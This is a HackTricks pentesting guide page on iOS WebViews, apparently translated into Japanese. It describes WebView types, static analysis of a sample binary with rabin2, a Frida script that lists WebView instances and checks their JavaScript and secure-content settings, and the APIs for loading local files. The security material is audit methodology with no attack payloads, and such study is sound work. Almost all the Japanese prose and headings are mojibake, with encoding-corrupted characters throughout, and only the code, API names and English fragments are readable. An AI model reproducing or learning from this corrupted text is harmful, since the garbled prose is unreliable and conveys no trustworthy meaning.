# iOS WebViews

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

## WebViewsã®ç¨®é¡

WebViewsã¯ã€ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒ†ã‚£ãƒ–ãª**ã‚¦ã‚§ãƒ–ã‚³ãƒ³ãƒ†ãƒ³ãƒ„**ã‚’è¡¨ç¤ºã™ã‚‹ãŸã‚ã®ã‚¢ãƒ—ãƒªå†…ãƒ–ãƒ©ã‚¦ã‚¶ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã§ã™ã€‚ã“ã‚Œã‚‰ã¯ã‚¢ãƒ—ãƒªã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã«ç›´æ¥ã‚¦ã‚§ãƒ–ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’åŸ‹ã‚è¾¼ã‚€ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚iOSã®WebViewsã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§**JavaScriptã®å®Ÿè¡Œã‚’ã‚µãƒãƒ¼ãƒˆ**ã—ã¦ã„ã‚‹ãŸã‚ã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®æ³¨å…¥ã‚„ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒ†ã‚£ãƒ³ã‚°æ”»æ’ƒã®å½±éŸ¿ã‚’å—ã‘ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

* [**UIWebView**](https://developer.apple.com/documentation/uikit/uiwebview)**:** iOS 12ä»¥é™ã§ã¯éæ¨å¥¨ã¨ãªã‚Šã€ä½¿ç”¨ã™ã¹ãã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚**JavaScriptã‚’ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“**ã€‚

* [**WKWebView**](https://developer.apple.com/documentation/webkit/wkwebview): ã“ã‚Œã¯ã‚¢ãƒ—ãƒªã®æ©Ÿèƒ½ã‚’æ‹¡å¼µã—ã€è¡¨ç¤ºã•ã‚Œã‚‹ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’åˆ¶å¾¡ã™ã‚‹ãŸã‚ã®é©åˆ‡ãªé¸æŠè‚¢ã§ã™ã€‚

* **JavaScript**ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§æœ‰åŠ¹ã§ã™ãŒã€`WKWebView`ã®`javaScriptEnabled`ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã«ã‚ˆã‚Šã€ã™ã¹ã¦ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆæ³¨å…¥ã®è„†å¼±æ€§ã‚’å®Œå…¨ã«ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

* **`JavaScriptCanOpenWindowsAutomatically`**ã¯ã€ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ãªã©ã®æ–°ã—ã„ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚’JavaScriptãŒé–‹ãã®ã‚’**é˜²æ­¢**ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚

* **`hasOnlySecureContent`**ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯ã€WebViewã«ã‚ˆã£ã¦èª­ã¿è¾¼ã¾ã‚Œã‚‹ãƒªã‚½ãƒ¼ã‚¹ãŒæš—å·åŒ–ã•ã‚ŒãŸæ¥ç¶šã‚’ä»‹ã—ã¦å–å¾—ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’æ¤œè¨¼ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚

* `WKWebView`ã¯ãƒ—ãƒ­ã‚»ã‚¹å¤–ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã‚’å®Ÿè£…ã—ã¦ã„ã‚‹ãŸã‚ã€ãƒ¡ãƒ¢ãƒªã®ç ´æãƒã‚°ã¯ãƒ¡ã‚¤ãƒ³ã®ã‚¢ãƒ—ãƒªãƒ—ãƒ­ã‚»ã‚¹ã«å½±éŸ¿ã‚’ä¸ãˆã¾ã›ã‚“ã€‚

*   [**SFSafariViewController**](https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller)**:** ã“ã‚Œã¯**ä¸€èˆ¬çš„ãªã‚¦ã‚§ãƒ–é–²è¦§ä½“é¨“**ã‚’æä¾›ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã¹ãã§ã™ã€‚ã“ã‚Œã‚‰ã®WebViewsã¯ã€ä»¥ä¸‹ã®è¦ç´ ã‚’å«ã‚€ç‰¹å¾´çš„ãªãƒ¬ã‚¤ã‚¢ã‚¦ãƒˆã‚’æŒã£ã¦ã„ã‚‹ãŸã‚ã€ç°¡å˜ã«è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

* ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¤ãƒ³ã‚¸ã‚±ãƒ¼ã‚¿ã‚’æŒã¤èª­ã¿å–ã‚Šå°‚ç”¨ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã€‚

* ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ï¼ˆã€Œ**å…±æœ‰**ã€ï¼‰**ãƒœã‚¿ãƒ³**ã€‚

* **å®Œäº†ãƒœã‚¿ãƒ³**ã€æˆ»ã‚‹ã¨é€²ã‚€ã®ãƒŠãƒ“ã‚²ãƒ¼ã‚·ãƒ§ãƒ³ãƒœã‚¿ãƒ³ã€ãŠã‚ˆã³ãƒšãƒ¼ã‚¸ã‚’ç›´æ¥Safariã§é–‹ãã€ŒSafariã€ãƒœã‚¿ãƒ³ã€‚

<img src="https://gblobscdn.gitbook.com/assets%2F-LH00RC4WVf3-6Ou4e0l%2F-Lf1APQHyCHdAvoJSvc_%2F-Lf1AQxr7FPsOyPFSGcs%2Fsfsafariviewcontroller.png?alt=media" alt="" data-size="original">

* `SFSafariViewController`ã§ã¯**JavaScriptã‚’ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ã¯ã§ããš**ã€ã“ã‚Œã¯`WKWebView`ã®ä½¿ç”¨ãŒæ¨å¥¨ã•ã‚Œã‚‹ç†ç”±ã®1ã¤ã§ã™ã€‚

* `SFSafariViewController`ã¯ã¾ãŸã€**ã‚¯ãƒƒã‚­ãƒ¼**ã‚„ä»–ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆãƒ‡ãƒ¼ã‚¿ã‚’**Safari**ã¨å…±æœ‰ã—ã¾ã™ã€‚

* ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®`SFSafariViewController`ã§ã®ã‚¢ã‚¯ãƒ†ã‚£ãƒ“ãƒ†ã‚£ã‚„ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€ã‚¢ãƒ—ãƒªã‹ã‚‰ã¯**è¦‹ãˆãªã„**ãŸã‚ã€AutoFillãƒ‡ãƒ¼ã‚¿ã€é–²è¦§å±¥æ­´ã€ã¾ãŸã¯ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆãƒ‡ãƒ¼ã‚¿ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚

* App Storeã®ãƒ¬ãƒ“ãƒ¥ãƒ¼ã‚¬ã‚¤ãƒ‰ãƒ©ã‚¤ãƒ³ã«ã‚ˆã‚Œã°ã€`SFSafariViewController`ã¯**ä»–ã®ãƒ“ãƒ¥ãƒ¼ã‚„ãƒ¬ã‚¤ãƒ¤ãƒ¼ã«ã‚ˆã£ã¦éš ã•ã‚ŒãŸã‚Šè¦†ã‚ã‚ŒãŸã‚Šã—ã¦ã¯ãªã‚Šã¾ã›ã‚“**ã€‚

## WebViewsã®è¨­å®šã®ç™ºè¦‹

### é™çš„è§£æ

**UIWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
489 0x0002fee9 0x10002fee9   9  10 (5.__TEXT.__cstring) ascii UIWebView
896 0x0003c813 0x0003c813  24  25 () ascii @_OBJC_CLASS_$_UIWebView
1754 0x00059599 0x00059599  23  24 () ascii _OBJC_CLASS_$_UIWebView
```
**WKWebView**

WKWebViewã¯ã€iOSã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã§Webã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’è¡¨ç¤ºã™ã‚‹ãŸã‚ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã§ã™ã€‚UIWebViewã«æ¯”ã¹ã¦é«˜é€Ÿã§ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ãŒå‘ä¸Šã—ã¦ãŠã‚Šã€ãƒã‚¤ãƒ†ã‚£ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¨åŒæ§˜ã®æ©Ÿèƒ½ã‚’æä¾›ã—ã¾ã™ã€‚

WKWebViewã¯ã€iOS 8ä»¥é™ã§åˆ©ç”¨å¯èƒ½ã§ã‚ã‚Šã€Safariã¨åŒã˜WebKitã‚¨ãƒ³ã‚¸ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ¢ãƒã‚¤ãƒ«ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã§Webãƒšãƒ¼ã‚¸ã‚’è¡¨ç¤ºã™ã‚‹éš›ã«ã€é«˜é€Ÿã‹ã¤å®‰å…¨ãªãƒ–ãƒ©ã‚¦ã‚¸ãƒ³ã‚°ä½“é¨“ã‚’æä¾›ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

WKWebViewã¯ã€ä»¥ä¸‹ã®ã‚ˆã†ãªç‰¹å¾´ã‚’æŒã£ã¦ã„ã¾ã™ã€‚

- JavaScriptã®å®Ÿè¡Œã¨é€šä¿¡ã®ã‚µãƒãƒ¼ãƒˆ
- ã‚«ã‚¹ã‚¿ãƒ ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œ
- ãƒšãƒ¼ã‚¸ã®èª­ã¿è¾¼ã¿çŠ¶æ…‹ã®ç›£è¦–
- ãƒšãƒ¼ã‚¸ã®ã‚¹ã‚¯ãƒ­ãƒ¼ãƒ«ã¨ã‚ºãƒ¼ãƒ ã®ã‚µãƒãƒ¼ãƒˆ
- ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ“ä½œã«å¯¾ã™ã‚‹ã‚¤ãƒ™ãƒ³ãƒˆã®å‡¦ç†
- ã‚¯ãƒƒã‚­ãƒ¼ã®ç®¡ç†
- ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒªã‚·ãƒ¼ã®é©ç”¨

WKWebViewã¯ã€iOSã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã«é–¢ã™ã‚‹é‡è¦ãªè¦ç´ ã§ã‚‚ã‚ã‚Šã¾ã™ã€‚é©åˆ‡ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è¨­å®šã‚’è¡Œã‚ãªã„ã¨ã€æ‚ªæ„ã®ã‚ã‚‹æ”»æ’ƒè€…ã«ã‚ˆã£ã¦ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®æƒ…å ±ãŒæ¼æ´©ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€iOSã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã«ãŠã„ã¦ã¯ã€WKWebViewã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è¨­å®šã‚’ç¢ºèªã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
490 0x0002fef3 0x10002fef3   9  10 (5.__TEXT.__cstring) ascii WKWebView
625 0x00031670 0x100031670  17  18 (5.__TEXT.__cstring) ascii unwindToWKWebView
904 0x0003c960 0x0003c960  24  25 () ascii @_OBJC_CLASS_$_WKWebView
1757 0x000595e4 0x000595e4  23  24 () ascii _OBJC_CLASS_$_WKWebView
```
ä»£ã‚ã‚Šã«ã€ã“ã‚Œã‚‰ã®WebViewã‚¯ãƒ©ã‚¹ã®æ—¢çŸ¥ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€WKWebViewã‚’åˆæœŸåŒ–ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ãƒ¡ã‚½ãƒƒãƒ‰ï¼ˆ[`init(frame:configuration:)`](https://developer.apple.com/documentation/webkit/wkwebview/1414998-init)ï¼‰ã‚’æ¤œç´¢ã—ã¦ãã ã•ã„ã€‚
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
0x5c3ac 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x5d97a 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
0x6b5d5 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x6c3fa 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
```
#### JavaScriptã®è¨­å®šã®ãƒ†ã‚¹ãƒˆ

`WKWebView`ã«ãŠã„ã¦ã¯ã€ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹ã¨ã—ã¦ã€JavaScriptã¯æ˜ç¤ºçš„ã«å¿…è¦ãªå ´åˆã‚’é™¤ãç„¡åŠ¹ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚JavaScriptãŒé©åˆ‡ã«ç„¡åŠ¹åŒ–ã•ã‚Œã¦ã„ã‚‹ã‹ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ã€`WKPreferences`ã®ä½¿ç”¨ç®‡æ‰€ã‚’ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆå†…ã§æ¤œç´¢ã—ã€[`javaScriptEnabled`](https://developer.apple.com/documentation/webkit/wkpreferences/1536203-javascriptenabled)ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒ`false`ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
```
let webPreferences = WKPreferences()
webPreferences.javaScriptEnabled = false
```
ã‚‚ã—ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸãƒã‚¤ãƒŠãƒªã—ã‹æŒã£ã¦ã„ãªã„å ´åˆã€ãã‚Œã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
391 0x0002f2c7 0x10002f2c7  17  18 (4.__TEXT.__objc_methname) ascii javaScriptEnabled
392 0x0002f2d9 0x10002f2d9  21  22 (4.__TEXT.__objc_methname) ascii setJavaScriptEnabled
```
#### OnlySecureContentã®ãƒ†ã‚¹ãƒˆ

`UIWebView`ã¨ã¯ç•°ãªã‚Šã€`WKWebView`ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€[ãƒŸãƒƒã‚¯ã‚¹ã‚³ãƒ³ãƒ†ãƒ³ãƒ„](https://developers.google.com/web/fundamentals/security/prevent-mixed-content/fixing-mixed-content?hl=en)ï¼ˆHTTPSãƒšãƒ¼ã‚¸ã‹ã‚‰èª­ã¿è¾¼ã¾ã‚ŒãŸHTTPã‚³ãƒ³ãƒ†ãƒ³ãƒ„ï¼‰ã‚’æ¤œå‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚[`hasOnlySecureContent`](https://developer.apple.com/documentation/webkit/wkwebview/1415002-hasonlysecurecontent)ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€ãƒšãƒ¼ã‚¸ä¸Šã®ã™ã¹ã¦ã®ãƒªã‚½ãƒ¼ã‚¹ãŒå®‰å…¨ã«æš—å·åŒ–ã•ã‚ŒãŸæ¥ç¶šã‚’ä»‹ã—ã¦èª­ã¿è¾¼ã¾ã‚ŒãŸã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸãƒã‚¤ãƒŠãƒªã§ã¯ã€
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚„æ–‡å­—åˆ—å†…ã§ "http://" ã¨ã„ã†æ–‡å­—åˆ—ã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ãŸã ã—ã€ã“ã‚Œã¯å¿…ãšã—ã‚‚ãƒŸãƒƒã‚¯ã‚¹ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã®å•é¡ŒãŒã‚ã‚‹ã“ã¨ã‚’æ„å‘³ã™ã‚‹ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ãƒŸãƒƒã‚¯ã‚¹ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«ã¤ã„ã¦è©³ã—ãã¯ã€[MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed\_content)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

### å‹•çš„è§£æ

`ObjC.choose()` ã‚’ä½¿ç”¨ã—ã¦ãƒ’ãƒ¼ãƒ—ã‚’æ¤œæŸ»ã—ã€ã•ã¾ã–ã¾ãªã‚¿ã‚¤ãƒ—ã® WebView ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã€`javaScriptEnabled` ã¨ `hasonlysecurecontent` ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦èª­ã¿è¾¼ã¿ã¾ã™ï¼š
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>

hasOnlySecureContent:  false
```
## WebViewãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®å‡¦ç†

iOSä¸Šã®WebViewã§ã¯ã€ã„ãã¤ã‹ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ã‚¹ã‚­ãƒ¼ãƒ ãŒåˆ©ç”¨å¯èƒ½ã§ã™ã€‚ä¾‹ãˆã°ï¼š

* http(s)://
* file://
* tel://

WebViewã¯ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‹ã‚‰ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’èª­ã¿è¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ãŒã€ã‚¢ãƒ—ãƒªã®ãƒ‡ãƒ¼ã‚¿ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‹ã‚‰ã‚‚ãƒ­ãƒ¼ã‚«ãƒ«ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’èª­ã¿è¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒ­ãƒ¼ã‚«ãƒ«ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãŒèª­ã¿è¾¼ã¾ã‚Œã‚‹å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãƒ•ã‚¡ã‚¤ãƒ«åã‚„ãƒ‘ã‚¹ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã¯ã§ããšã€èª­ã¿è¾¼ã¾ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç·¨é›†ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã›ã‚“ã€‚

### WebViewã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã®èª­ã¿è¾¼ã¿

* **UIWebView**: éæ¨å¥¨ã®ãƒ¡ã‚½ãƒƒãƒ‰ [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617979-loadhtmlstring?language=objc) ã‚„ [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617941-loaddata?language=objc) ã‚’ä½¿ç”¨ã—ã¦ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’èª­ã¿è¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚
* **WKWebView**: ãƒ¡ã‚½ãƒƒãƒ‰ [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415004-loadhtmlstring?language=objc) ã‚„ [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415011-loaddata?language=objc) ã‚’ä½¿ç”¨ã—ã¦ãƒ­ãƒ¼ã‚«ãƒ«ã®HTMLãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã€webã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã®èª­ã¿è¾¼ã¿ã«ã¯ `loadRequest:` ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚é€šå¸¸ã€ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã¯ã€[`pathForResource:ofType:`](https://developer.apple.com/documentation/foundation/nsbundle/1410989-pathforresource)ã€[`URLForResource:withExtension:`](https://developer.apple.com/documentation/foundation/nsbundle/1411540-urlforresource?language=objc)ã€[`init(contentsOf:encoding:)`](https://developer.apple.com/documentation/swift/string/3126736-init)ãªã©ã®ãƒ¡ã‚½ãƒƒãƒ‰ã¨çµ„ã¿åˆã‚ã›ã¦èª­ã¿è¾¼ã¾ã‚Œã¾ã™ã€‚ã•ã‚‰ã«ã€ã‚¢ãƒ—ãƒªãŒãƒ¡ã‚½ãƒƒãƒ‰ [`loadFileURL:allowingReadAccessToURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1414973-loadfileurl?language=objc) ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚‚ç¢ºèªã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®ãƒ¡ã‚½ãƒƒãƒ‰ã®æœ€åˆã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¯ `URL` ã§ã‚ã‚Šã€WebViewã«èª­ã¿è¾¼ã¾ã‚Œã‚‹URLã‚’å«ã¿ã¾ã™ã€‚2ç•ªç›®ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ `allowingReadAccessToURL` ã«ã¯ã€å˜ä¸€ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¾ãŸã¯ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒå«ã¾ã‚Œã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚å˜ä¸€ã®ãƒ•ã‚¡ã‚¤ãƒ«ãŒå«ã¾ã‚Œã‚‹å ´åˆã€ãã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯WebViewã§åˆ©ç”¨å¯èƒ½ã«ãªã‚Šã¾ã™ã€‚ãŸã ã—ã€ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒå«ã¾ã‚Œã‚‹å ´åˆã€ãã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªå†…ã®ã™ã¹ã¦ã®ãƒ•ã‚¡ã‚¤ãƒ«ãŒWebViewã§åˆ©ç”¨å¯èƒ½ã«ãªã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ã“ã‚Œã‚’èª¿æŸ»ã—ã€ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®å ´åˆã¯å†…éƒ¨ã«æ©Ÿå¯†ãƒ‡ãƒ¼ã‚¿ãŒå«ã¾ã‚Œã¦ã„ãªã„ã“ã¨ã‚’ç¢ºèªã™ã‚‹ä¾¡å€¤ãŒã‚ã‚Šã¾ã™ã€‚

